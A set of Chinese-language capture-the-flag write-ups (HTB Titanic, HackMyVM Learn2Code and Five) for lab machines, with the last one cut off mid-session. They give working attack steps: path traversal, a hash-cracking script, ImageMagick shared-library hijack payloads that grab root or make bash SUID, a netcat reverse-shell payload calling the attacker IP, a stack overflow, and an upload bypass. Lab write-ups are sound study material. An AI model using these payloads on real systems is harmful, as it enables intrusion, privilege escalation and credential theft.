[{"title":"HTB-Titanic","url":"/2025/05/09/HTB-Titanic/","content":"\n# ä¿¡æ¯æœé›†\n\n~~~\nroot@kali:~# rustscan -a 10.10.11.55\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: https://discord.gg/GFrQsGy           :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nNmap? More like slowmap.ğŸ¢\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers\n[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. \nOpen 10.10.11.55:22\nOpen 10.10.11.55:80\n[~] Starting Script(s)\n[>] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\")\n\n[~] Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-09 08:25 UTC\nInitiating Ping Scan at 08:25\nScanning 10.10.11.55 [4 ports]\nCompleted Ping Scan at 08:25, 0.18s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 08:25\nCompleted Parallel DNS resolution of 1 host. at 08:25, 0.00s elapsed\nDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 08:25\nScanning 10.10.11.55 [2 ports]\nDiscovered open port 80/tcp on 10.10.11.55\nDiscovered open port 22/tcp on 10.10.11.55\nCompleted SYN Stealth Scan at 08:25, 0.52s elapsed (2 total ports)\nNmap scan report for 10.10.11.55\nHost is up, received echo-reply ttl 63 (0.26s latency).\nScanned at 2025-05-09 08:25:00 UTC for 1s\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 63\n80/tcp open  http    syn-ack ttl 63\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.83 seconds\n           Raw packets sent: 6 (240B) | Rcvd: 6 (236B\n~~~\n\nå¼€æ”¾äº†22å’Œ80ç«¯å£\n\n80ç«¯å£ä¼šè‡ªåŠ¨è·³è½¬`titanic.htb`åŸŸåï¼Œæ·»åŠ ä¸€ä¸‹host\n\n~~~\n10.10.11.55 titanic.htb\n~~~\n\næšä¸¾ä¸€ä¸‹å­åŸŸåå¯ä»¥å‘ç°æœ‰ä¸€ä¸ª`dev`,åŒæ ·æ·»åŠ è¿›å»\n\n~~~\n10.10.11.55 titanic.htb dev.titanic.htb\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 28 -u \"http://10.10.\n11.55\" -H \"Host: FUZZ.titanic.htb\"\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://10.10.11.55/\nTotal requests: 220559\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n\n000000001:   400        10 L     35 W       303 Ch      \"# directory-list-2.3-medium.txt\"\n000000003:   400        10 L     35 W       303 Ch      \"# Copyright 2007 James Fisher\"\n000000007:   400        10 L     35 W       303 Ch      \"# license, visit http://creativecommons.org/licenses/b\n                                                        y-sa/3.0/\"\n000000010:   400        10 L     35 W       303 Ch      \"#\"\n000000011:   400        10 L     35 W       303 Ch      \"# Priority ordered case-sensitive list, where entries\n                                                        were found\"\n000000009:   400        10 L     35 W       303 Ch      \"# Suite 300, San Francisco, California, 94105, USA.\"\n000000005:   400        10 L     35 W       303 Ch      \"# This work is licensed under the Creative Commons\"\n000000013:   400        10 L     35 W       303 Ch      \"#\"\n000000008:   400        10 L     35 W       303 Ch      \"# or send a letter to Creative Commons, 171 Second Str\n                                                        eet,\"\n000000006:   400        10 L     35 W       303 Ch      \"# Attribution-Share Alike 3.0 License. To view a copy\n                                                        of this\"\n000000012:   400        10 L     35 W       303 Ch      \"# on at least 2 different hosts\"\n000000002:   400        10 L     35 W       303 Ch      \"#\"\n000000004:   400        10 L     35 W       303 Ch      \"#\"\n000000834:   200        275 L    1278 W     13870 Ch    \"dev\"\n~~~\n\n# 80ç«¯å£\n\nç‚¹å‡»å³ä¸Šè§’çš„booknowåå¡«å†™å®Œä¿¡æ¯ï¼Œç„¶åæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªdownloadçš„ä¸€ä¸ªè·¯ç”±ï¼Œå°†å…¶ä¿®æ”¹æˆ\n\n~~~php\n/download?ticket=/etc/passwd\n~~~\n\nå‘ç°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–,å¯ä»¥ç›´æ¥è¯»å–user.txt\n\n~~~\n/download?ticket=/home/developer/user.txt\n~~~\n\n# Gitea\n\nå‰é¢çš„`dev.titanic.htb`æ˜¯ä¸€ä¸ªgiteaçš„ç½‘ç«™ï¼Œç‰ˆæœ¬æ˜¯`1.22.1 `,ç‚¹å‡»å·¦ä¸Šè§’çš„æ¢ç´¢è·³è½¬åˆ°äº†ä¸€ä¸ªä»“åº“ï¼Œç„¶åæœ‰giteaå’Œmysqlçš„docker-compose.ymlæ–‡ä»¶\n\n~~~\n#gitea\nversion: '3'\n\nservices:\n  gitea:\n    image: gitea/gitea\n    container_name: gitea\n    ports:\n      - \"127.0.0.1:3000:3000\"\n      - \"127.0.0.1:2222:22\"  # Optional for SSH access\n    volumes:\n      - /home/developer/gitea/data:/data # Replace with your path\n    environment:\n      - USER_UID=1000\n      - USER_GID=1000\n    restart: always\n~~~\n\n~~~\n#mysql\nversion: '3.8'\n\nservices:\n  mysql:\n    image: mysql:8.0\n    container_name: mysql\n    ports:\n      - \"127.0.0.1:3306:3306\"\n    environment:\n      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'\n      MYSQL_DATABASE: tickets \n      MYSQL_USER: sql_svc\n      MYSQL_PASSWORD: sql_password\n    restart: always\n~~~\n\nå¯ä»¥çŸ¥é“giteaçš„è·¯å¾„å’Œmysqlçš„å¯†ç ï¼Œgiteaçš„é…ç½®æ–‡ä»¶é»˜è®¤åœ¨`/etc/gitea/conf/app.ini`è¿™é‡Œå¯èƒ½æ˜¯åœ¨`/home/developer/gitea/conf/app.ini`ä¸å¯¹ï¼Œé‚£å°±æ˜¯`/home/developer/gitea/data/gitea/conf/app.ini`è¿™ä¸‹å¯¹äº†\n\n~~~\nPP_NAME = Gitea: Git with a cup of tea\nRUN_MODE = prod\nRUN_USER = git\nWORK_PATH = /data/gitea\n\n[repository]\nROOT = /data/git/repositories\n\n[repository.local]\nLOCAL_COPY_PATH = /data/gitea/tmp/local-repo\n\n[repository.upload]\nTEMP_PATH = /data/gitea/uploads\n\n[server]\nAPP_DATA_PATH = /data/gitea\nDOMAIN = gitea.titanic.htb\nSSH_DOMAIN = gitea.titanic.htb\nHTTP_PORT = 3000\nROOT_URL = http://gitea.titanic.htb/\nDISABLE_SSH = false\nSSH_PORT = 22\nSSH_LISTEN_PORT = 22\nLFS_START_SERVER = true\nLFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4\nOFFLINE_MODE = true\n\n[database]\nPATH = /data/gitea/gitea.db\nDB_TYPE = sqlite3\nHOST = localhost:3306\nNAME = gitea\nUSER = root\nPASSWD = \nLOG_SQL = false\nSCHEMA = \nSSL_MODE = disable\n\n[indexer]\nISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve\n\n[session]\nPROVIDER_CONFIG = /data/gitea/sessions\nPROVIDER = file\n\n[picture]\nAVATAR_UPLOAD_PATH = /data/gitea/avatars\nREPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars\n\n[attachment]\nPATH = /data/gitea/attachments\n\n[log]\nMODE = console\nLEVEL = info\nROOT_PATH = /data/gitea/log\n\n[security]\nINSTALL_LOCK = true\nSECRET_KEY = \nREVERSE_PROXY_LIMIT = 1\nREVERSE_PROXY_TRUSTED_PROXIES = *\nINTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8\nPASSWORD_HASH_ALGO = pbkdf2\n\n[service]\nDISABLE_REGISTRATION = false\nREQUIRE_SIGNIN_VIEW = false\nREGISTER_EMAIL_CONFIRM = false\nENABLE_NOTIFY_MAIL = false\nALLOW_ONLY_EXTERNAL_REGISTRATION = false\nENABLE_CAPTCHA = false\nDEFAULT_KEEP_EMAIL_PRIVATE = false\nDEFAULT_ALLOW_CREATE_ORGANIZATION = true\nDEFAULT_ENABLE_TIMETRACKING = true\nNO_REPLY_ADDRESS = noreply.localhost\n\n[lfs]\nPATH = /data/git/lfs\n\n[mailer]\nENABLED = false\n\n[openid]\nENABLE_OPENID_SIGNIN = true\nENABLE_OPENID_SIGNUP = true\n\n[cron.update_checker]\nENABLED = false\n\n[repository.pull-request]\nDEFAULT_MERGE_STYLE = merge\n\n[repository.signing]\nDEFAULT_TRUST_MODEL = committer\n\n[oauth2]\nJWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g\n\n~~~\n\nç„¶åè¯»å–æ•°æ®åº“æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ç”¨navicatæ‰“å¼€\n\nå¯ä»¥æ‹¿åˆ°developerçš„å¯†ç ä¸ºe531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56\n\nç„¶åç”¨è„šæœ¬è·‘ä¸€ä¸‹å¯†ç \n\n~~~python\nimport hashlib\nimport binascii\n \ndef pbkdf2_hash(password, salt, iterations=50000, dklen=50):\n    hash_value = hashlib.pbkdf2_hmac(\n        'sha256',\n        password.encode('utf-8'),\n        salt,\n        iterations,\n        dklen\n    )\n    return hash_value\n \ndef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):\n    target_hash_bytes = binascii.unhexlify(target_hash)\n    \n    with open(dictionary_file, 'r', encoding='utf-8') as file:\n        count = 0\n        for line in file:\n            password = line.strip()\n            hash_value = pbkdf2_hash(password, salt, iterations, dklen)\n            count += 1\n            print(f\"æ­£åœ¨æ£€æŸ¥å¯†ç  {count}: {password}\")\n            if hash_value == target_hash_bytes:\n                print(f\"\\nFound password: {password}\")\n                return password\n        print(\"Password not found.\")\n        return None\n \nsalt = binascii.unhexlify('8bf3e3452b78544f8bee9400d6936d34')\ntarget_hash = 'e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56'\ndictionary_file = '/usr/share/wordlists/rockyou.txt'\nfind_matching_password(dictionary_file, target_hash, salt)\n\n~~~\n\nå¯ä»¥çˆ†ç ´å‡ºæ¥å¯†ç æ˜¯`25282528`,sshè¿æ¥\n\n# ææƒ\n\n~~~\ndeveloper@titanic:~$ sudo -l\n[sudo] password for developer:\nSorry, user developer may not run sudo on titanic.\n~~~\n\nsudoæ²¡æœ‰ä¸œè¥¿\n\n~~~\ndeveloper@titanic:~$ find / -perm -u=s 2>/dev/null\n/snap/core20/2434/usr/bin/chfn\n/snap/core20/2434/usr/bin/chsh\n/snap/core20/2434/usr/bin/gpasswd\n/snap/core20/2434/usr/bin/mount\n/snap/core20/2434/usr/bin/newgrp\n/snap/core20/2434/usr/bin/passwd\n/snap/core20/2434/usr/bin/su\n/snap/core20/2434/usr/bin/sudo\n/snap/core20/2434/usr/bin/umount\n/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/2434/usr/lib/openssh/ssh-keysign\n/snap/snapd/23545/usr/lib/snapd/snap-confine\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/chfn\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/fusermount3\n~~~\n\nsuidä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥ç”¨çš„ï¼Œåœ¨optä¸‹æœ‰ä¸€ä¸ªshellè„šæœ¬\n\n~~~\ndeveloper@titanic:/opt/scripts$ cat identify_images.sh\ncd /opt/app/static/assets/images\ntruncate -s 0 metadata.log\nfind /opt/app/static/assets/images/ -type f -name \"*.jpg\" | xargs /usr/bin/magick identify >> metadata.log\n~~~\n\n~~~\ndeveloper@titanic:/opt/scripts$ magick --version\nVersion: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org\nCopyright: (C) 1999 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5)\nDelegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib\nCompiler: gcc (9.4)\n~~~\n\nç‰ˆæœ¬å·æ˜¯7.1.1-35ï¼Œç½‘ä¸Šä¸€æœå°±èƒ½æœåˆ°æœ‰[æ¼æ´](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)cd è¿›/opt/app/static/assets/images/\n\nç„¶åè¾“å…¥\n\n~~~\ngcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void init(){\n    system(\"cp /root/root.txt root.txt; chmod 754 root.txt\");\n    exit(0);\n}\nEOF\n~~~\n\nç­‰ä¸€ä¸‹å°±ä¼šcp root.txtè¿›æ¥ï¼Œæ‹¿shellçš„è¯å°±æ˜¯\n\n~~~\ngcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void init(){\n    system(\"chmod +s /bin/bash\");\n    exit(0);\n}\nEOF\n~~~\n\nç„¶åbash -på³å¯\n","tags":["é¶æœº"],"categories":["HTB"]},{"title":"HackmyVM-Learn2Code","url":"/2025/05/08/HackmyVM-Learn2Code/","content":"\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27:80:63:b8       PCS Systemtechnik GmbH\n192.168.31.178  08:00:27:7c:36:6c       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.436 seconds (105.09 hosts/sec). 3 responded\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# rustscan -a 192.168.31.178 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nScanning ports faster than you can say 'SYN ACK'\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.178:80\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 01:29 EDT\nInitiating ARP Ping Scan at 01:29\nScanning 192.168.31.178 [1 port]\nCompleted ARP Ping Scan at 01:29, 0.07s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 01:29\nCompleted Parallel DNS resolution of 1 host. at 01:29, 0.05s elapsed\nDNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 01:29\nScanning 192.168.31.178 [1 port]\nDiscovered open port 80/tcp on 192.168.31.178\nCompleted SYN Stealth Scan at 01:29, 0.02s elapsed (1 total ports)\nNmap scan report for 192.168.31.178\nHost is up, received arp-response (0.00031s latency).\nScanned at 2025-05-08 01:29:48 EDT for 0s\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:7C:36:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.26 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n~~~\n\nåªå¼€äº†ä¸€ä¸ª80ç«¯å£\n\n# 80ç«¯å£\n\næ‰«æä¸€ä¸‹ç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.178/\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m\nedium.txt -x .txt,.php,.html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.178/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              html,txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 279]\n/.php                 (Status: 403) [Size: 279]\n/index.php            (Status: 200) [Size: 1161]\n/includes             (Status: 301) [Size: 319] [--> http://192.168.31.178/includes/]\n/todo.txt             (Status: 200) [Size: 51]\n/.html                (Status: 403) [Size: 279]\n/.php                 (Status: 403) [Size: 279]\n~~~\n\ntodo.txt:\n\n~~~\n\n******* Remember to delete the bak files!! *******\n~~~\n\nç„¶åincludesæœ‰ç›®å½•ä¾¿åˆ©å¯ä»¥çœ‹åˆ°access.php.bak:\n\n~~~\n<?php\n\trequire_once 'GoogleAuthenticator.php';\n\t$ga = new PHPGangsta_GoogleAuthenticator();\n\t$secret = \"S4I22IG3KHZIGQCJ\";\n\n\tif ($_POST['action'] == 'check_code') {\n\t\t$code = $_POST['code'];\n\t\t$result = $ga->verifyCode($secret, $code, 1);\n\n\t\tif ($result) {\n\t\t\tinclude('coder.php');\n\t\t} else {\n\t\t\techo \"wrong\";\n\t\t}\n\t}\n?>\n~~~\n\nè¿™ä¸ªéªŒè¯ç æ˜¯é€šè¿‡`GoogleAuthenticator.php`æ£€éªŒçš„,è°·æ­Œæœ‰ä¸€ä¸ªè°·æ­Œèº«ä»½éªŒè¯å™¨ï¼Œå°†è¿™ä¸ªå¯†é’¥è¾“å…¥è¿›å»å°±å¯ä»¥å¾—åˆ°éªŒè¯ç ï¼Œè¾“å…¥éªŒè¯ç è¿›å…¥åˆ°è¾“å…¥codeçš„é¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œpythonä»£ç ï¼Œè€Œä¸”é€šè¿‡æŠ¥é”™å¯ä»¥å¾—çŸ¥æ˜¯ç”¨execæ‰§è¡Œçš„ä»£ç \n\n~~~\n__import__('os').system('nc -e /bin/bash 192.168.31.129 4444')\n~~~\n\nåå¼¹ä¸€ä¸ªshellå›æ¥\n\n# ææƒ\n\n~~~\nwww-data@Learn2Code:/var/www/html/includes/php$ find / -perm -u=s 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/MakeMeLearner\n/usr/bin/chfn\n~~~\n\næœ‰ä¸€ä¸ª`MakeMeLearner`å¾ˆå¯ç–‘ä¸‹è½½ä¸‹æ¥ï¼Œidaæ‰“å¼€\n\n~~~\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char dest[76]; // [rsp+10h] [rbp-50h] BYREF\n  int v5; // [rsp+5Ch] [rbp-4h]\n\n  if ( argc == 1 )\n    errx(1, \"please specify an argument\\n\", envp);\n  printf(\"Change the 'modified' variable value to '0x61626364' to be a learner\");\n  v5 = 0;\n  strcpy(dest, argv[1]);\n  if ( v5 == 1633837924 )\n  {\n    setuid(0x3E8u);\n    setgid(0x3E8u);\n    system(\"/bin/bash\");\n  }\n  else\n  {\n    printf(\"Try again, you got 0x%08x\\n\", v5);\n  }\n  return 0;\n}\n~~~\n\nstrcpyå¯ä»¥æ ˆæº¢å‡ºï¼Œdestçš„å¤§å°æ˜¯76è¾“å…¥77ä¸ªaä¼šå‘ç°\n\n~~~\nChange the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x00000061\n~~~\n\nå¯ä»¥å‘ç°æº¢å‡ºåˆ°è¿™é‡Œäº†ä»–æƒ³è¦0x61626364,å°±è¾“å…¥dcba,å› ä¸ºä»–æ˜¯å°ç«¯åº\n\n~~~\nChange the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x00000061\n<aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcba\nlearner@Learn2Code:/var/www/html/includes/php$\n~~~\n\nè¿™æ ·å°±æ‹¿åˆ°useräº†\n\n# ææƒROOT\n\nlearnerçš„å®¶ç›®å½•æœ‰ä¸€ä¸ª`MySecretPasswordVault`ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹\n\n~~~\n; Attributes: bp-based frame\n\n; int __fastcall main(int argc, const char **argv, const char **envp)\npublic main\nmain proc near\n\nvar_18= qword ptr -18h\nvar_10= qword ptr -10h\nvar_8= qword ptr -8\n\n; __unwind {\npush    rbp\nmov     rbp, rsp\nsub     rsp, 20h\nlea     rax, aNoi98ho   ; \"NOI98hO\"\nmov     [rbp+var_8], rax\nlea     rax, aIhj       ; \"Ihj\"\nmov     [rbp+var_10], rax\nlea     rax, aJj        ; \")(Jj\"\nmov     [rbp+var_18], rax\nlea     rdi, s          ; \"If you are a learner, i'm sure you know\"...\ncall    _puts\nmov     eax, 0\nleave\nretn\n; } // starts at 1135\nmain endp\n\n~~~\n\n~~~\nNOI98hOIhj)(Jj\n~~~\n\nè¿™ä¸ªå°±æ˜¯rootçš„å¯†ç \n","tags":["é¶æœº"],"categories":["HackMyVM"]},{"title":"HackmyVM-Five","url":"/2025/05/07/HackmyVM-Five/","content":"\n# ä¿¡æ¯æœé›†\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c: 29: ff: 66:80, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    0a: 00:27:00:00:11       (Unknown: locally administered)\n192.168.31.2    08:00:27: dd: ef: c8       PCS Systemtechnik GmbH\n192.168.31.177  08:00:27: fe: 58: c8       PCS Systemtechnik GmbH\n\n3 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.411 seconds (106.18 hosts/sec). 3 responded\n~~~\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# rustscan -a 192.168.31.177 -r 1-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: http://discord.skerritt.blog         :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\nTCP handshake? More like a friendly high-five!\n\n[~] The config file is expected to be at \"/root/.rustscan.toml\"\n[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 65435'.\nOpen 192.168.31.177:80\n[~] Starting Script(s)\n[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-07 01:31 EDT\nInitiating ARP Ping Scan at 01:31\nScanning 192.168.31.177 [1 port]\nCompleted ARP Ping Scan at 01:31, 0.04s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 01:31\nCompleted Parallel DNS resolution of 1 host. at 01:31, 0.04s elapsed\nDNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]\nInitiating SYN Stealth Scan at 01:31\nScanning 192.168.31.177 [1 port]\nDiscovered open port 80/tcp on 192.168.31.177\nCompleted SYN Stealth Scan at 01:31, 0.02s elapsed (1 total ports)\nNmap scan report for 192.168.31.177\nHost is up, received arp-response (0.00042s latency).\nScanned at 2025-05-07 01:31:14 EDT for 0s\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 64\nMAC Address: 08:00:27:FE:58:C8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nRead data files from: /usr/share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.20 seconds\n           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)\n~~~\n\nåªå¼€å¯äº†ä¸€ä¸ª80ç«¯å£\n\n# 80ç«¯å£\n\né¦–é¡µæ˜¯403ï¼Œæ‰«æä¸€ä¸‹ç›®å½•\n\n~~~\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]\nâ””â”€# gobuster dir -u \"http://192.168.31.177\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.177\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/uploads              (Status: 301) [Size: 185] [--> http://192.168.31.177/uploads/]\n/admin                (Status: 301) [Size: 185] [--> http://192.168.31.177/admin/]\n/upload.php           (Status: 200) [Size: 48]\n/robots.txt           (Status: 200) [Size: 17]\n/upload.html          (Status: 200) [Size: 346]\n~~~\n\n`/robots.txt`è®©è®¿é—®`/admin`ï¼Œè¿˜æœ‰ä¸€ä¸ª`upload.html`å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ ä¸Šåè®¿é—®uploads/rev.phpï¼Œä¼šæ˜¾ç¤º403ï¼Œä¸ŠbpæŠ“ä¸ªåŒ…çœ‹çœ‹\n\n~~~\n------WebKitFormBoundaryRK8GGBtt0YpPaKBf\nContent-Disposition: form-data; name=\"directory\"\n\nuploads/\n------WebKitFormBoundaryRK8GGBtt0YpPaKBf\nContent-Disposition: form-data; name=\"submit\"\n\nUpload File\n------WebKitFormBoundaryRK8GGBtt0YpPaKBf--\n~~~\n\nè¯·æ±‚ä½“ä¸­æœ‰ä¸€ä¸ªä¸Šä¼ è·¯å¾„ï¼Œç»™uploadsåˆ äº†çœ‹çœ‹ï¼Œç„¶åè®¿é—®/rev.phpï¼Œå¯ä»¥è®¿é—®äº†ï¼Œç›‘å¬ç«¯å£ï¼Œåå¼¹shellå‡ºæ¥\n\n# ææƒmelisa\n\n~~~\nwww-data@five:/$ sudo -l\nMatching Defaults entries for www-data on five:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on five:\n    (melisa) NOPASSWD: /bin/cp\n~~~\n\n~~~\nwww-data@five:/tmp$ ss -lntup\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port\n\nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*\n\ntcp     LISTEN   0        128            127.0.0.1:4444          0.0.0.0:*\n\ntcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*       users:((\"nginx\",pid=409,fd=6))\n\ntcp     LISTEN   0        128                 [::]:80               [::]:*       users:((\"nginx\",pid=409,fd=7))\n~~~\n\n~~~\nwww-data@five:/tmp$ nc 127.0.0.1 4444\nSSH-2.0-OpenSSH_7.9p1 